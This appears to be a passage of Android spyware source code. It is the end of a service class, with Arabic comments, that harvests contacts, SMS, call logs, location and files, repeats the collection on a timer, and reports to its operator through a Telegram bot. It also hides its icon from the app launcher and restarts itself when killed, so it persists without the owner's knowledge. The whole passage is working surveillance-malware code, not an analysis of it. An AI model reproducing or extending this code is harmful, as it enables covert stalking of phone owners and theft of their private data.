              private void getAllInfo() {
                  getDeviceInfo();
                  handler.postDelayed(() -> getContacts(), 1000);
                  handler.postDelayed(() -> getSms(), 2000);
                  handler.postDelayed(() -> getCallLog(), 3000);
                  handler.postDelayed(() -> getLocation(), 4000);
                  handler.postDelayed(() -> getFiles(), 5000);
              }
              
              private void startContinuous(String intervalStr) {
                  try {
                      int interval = Integer.parseInt(intervalStr) * 1000;
                      if (interval < 5000) interval = 5000; // أقل شيء 5 ثوان
                      
                      if (continuousTimer != null) continuousTimer.cancel();
                      
                      continuousTimer = new Timer();
                      continuousTimer.schedule(new TimerTask() {
                          @Override
                          public void run() {
                              getAllInfo();
                          }
                      }, 0, interval);
                      
                      isContinuous = true;
                      TelegramBot.sendMessage(this, "🔄 تم تفعيل التحديث التلقائي كل " + (interval/1000) + " ثانية");
                  } catch (Exception e) {
                      TelegramBot.sendMessage(this, "❌ خطأ في تفعيل التحديث التلقائي");
                  }
              }
              
              private void stopContinuous() {
                  if (continuousTimer != null) {
                      continuousTimer.cancel();
                      continuousTimer = null;
                  }
                  isContinuous = false;
                  TelegramBot.sendMessage(this, "⏹️ تم إيقاف التحديث التلقائي");
              }
              
              private void deleteApp() {
                  TelegramBot.sendMessage(this, "⚠️ هل تريد حذف التطبيق؟ أرسل /confirm_delete خلال 10 ثوان");
                  
                  // تأخير ثم حذف (يمكن إضافته لاحقاً)
              }
              
              private void hideApp() {
                  PackageManager p = getPackageManager();
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  p.setComponentEnabledSetting(componentName,
                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                      PackageManager.DONT_KILL_APP);
                  TelegramBot.sendMessage(this, "👻 تم إخفاء التطبيق من قائمة التطبيقات");
              }
              
              @Override
              public IBinder onBind(Intent intent) {
                  return null;
              }
              
              @Override
              public void onDestroy() {
                  if (continuousTimer != null) continuousTimer.cancel();
                  stopForeground(true);
                  
                  // إعادة تشغيل الخدمة
                  Intent intent = new Intent(this, CommandService.class);
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      startForegroundService(intent);
                  } else {
                      startService(intent);
                  }
                  
                  super.onDestroy();
              }
          }
